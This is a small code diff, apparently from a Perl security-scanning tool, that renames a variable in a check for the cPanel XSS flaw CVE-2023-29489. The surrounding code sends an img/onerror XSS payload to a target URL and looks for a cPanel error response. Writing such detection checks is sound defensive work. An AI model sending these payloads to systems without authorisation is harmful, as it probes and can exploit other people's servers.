@@ -20,7 +20,7 @@ package Spellbook::Advisory::CVE_2023_29489 {
                 $target = "https://$target";
             }
 
-            my $userAgent = Spellbook::Core::UserAgent -> new();
+            my $user_agent = Spellbook::Core::UserAgent -> new();
 
             my @payloads = (
                 "cpanelwebcall/<img%20src=x%20onerror=\"prompt(1)\">aaaaaaaaaaaa",
@@ -28,7 +28,7 @@ package Spellbook::Advisory::CVE_2023_29489 {
             );
 
             foreach my $payload (@payloads) {
-                my $request = $userAgent -> get("$target/$payload");
+                my $request = $user_agent -> get("$target/$payload");
 
                 if ($request -> code() == 400 ) {
                     if ($request -> content() =~ /cPanel/msx) {
